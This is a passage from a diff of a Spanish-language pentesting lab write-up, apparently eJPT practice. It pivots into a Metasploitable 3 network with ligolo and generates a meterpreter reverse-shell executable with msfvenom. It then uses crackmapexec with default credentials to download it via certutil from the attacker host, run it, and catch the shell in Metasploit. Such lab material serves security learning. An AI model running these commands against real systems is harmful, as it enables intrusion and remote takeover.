+./agent_lin32 <span class="nt">-connect</span> 192.168.100.140:11601 <span class="nt">-ignore-cert</span> <span class="c">#Ip de kali</span>
+
+<span class="nb">sudo </span>ligolo-proxy <span class="nt">-selfcert</span>
+    <span class="c">#Con esto accedemos pero hay q dejar modo escucha antes de ejecutar el agente</span>
+session
+    start <span class="c">#Con esto ya establecemos el tunel a la red inaccesible</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>Con eso ya podemos atacar normalmente a las ips de los demás dispositivos de otra red. Pero OJO la comunicación solo es kali a Windows.</p>
+
+<h3 id="ataque-a-metasploitable-3"><span class="me-2">Ataque a metasploitable 3</span><a href="#ataque-a-metasploitable-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>xfreerdp /v:10.10.10.130 /u:vagrant /p:vagrant /cert:ignore /sec:rdp
+</pre></td></tr></tbody></table></code></div></div>
+<p>Ahora como la comunicación es solo unidireccional, de windows a kali no tengo respuesta, para ello utilizamos ligolo para redireccionar el tráfico</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>listener_add <span class="nt">--addr</span> 0.0.0.0:8080 <span class="nt">--to</span> 127.0.0.1:80 <span class="c">#Todo lo que llegue redirigir a mi equipo local</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>Ahora vamos a enviar un payload</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOSTS</span><span class="o">=</span>10.10.10.128 <span class="nv">LPORT</span><span class="o">=</span>8080 <span class="nt">-f</span> exe <span class="nt">-o</span> reverse.exe
+python3 <span class="nt">-m</span> http.server 80
+</pre></td></tr></tbody></table></code></div></div>
+<p>Ahora en otra ventana de kali</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>psexec.py vagrant:vagrant@10.10.10.218 <span class="c">#si no tengo esta conexión</span>
+crackmapexec smb 10.10.10.218 <span class="nt">-u</span> vagrant <span class="nt">-p</span> vagrant <span class="nt">-x</span> <span class="s1">'certutil -urlcache -split -f http://10.10.10.128:8080/reverse.exe reverse.exe'</span>
+crackmapexec smb 10.10.10.218 <span class="nt">-u</span> vagrant <span class="nt">-p</span> vagrant <span class="nt">-x</span> <span class="s1">'dir'</span>
+
+crackmapexec smb 10.10.10.218 <span class="nt">-u</span> vagrant <span class="nt">-p</span> vagrant <span class="nt">-x</span> <span class="s1">'c:\reverse.exe'</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>ahora debemos escuchar la revshell</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>msfconsole <span class="nt">-q</span>
+use /exploit/multi/handler
+    <span class="nb">set </span>payload windows/x64/meterpreter/reverse_tcp
+    <span class="nb">set </span>lhost 0.0.0.0
+    <span class="nb">set </span>lport 80
+    run
+</pre></td></tr></tbody></table></code></div></div>
+<p>Con eso levantamos meterpreter luego de ejecutar el revshell en windows.</p>
+
+<p>Con eso finalizamos todos estos laboratorios.</p>
 
   </div>
 
@@ -1872,14 +2538,14 @@ Con eso terminamos esta máquina y simplementa queda explorar los directorios.</
         
         
         <li class="text-truncate lh-lg">
-          <a href="/posts/Recomendaciones-ejpt/">Recomendaciones eJPT</a>
+          <a href="/posts/ruta-secreta-ejpt/">La ruta secreta para la certificación eJPT</a>
         </li>
       
         
         
         
         <li class="text-truncate lh-lg">
-          <a href="/posts/ruta-secreta-ejpt/">La ruta secreta para la certificación eJPT</a>
+          <a href="/posts/Recomendaciones-ejpt/">Recomendaciones eJPT</a>
         </li>
       
         
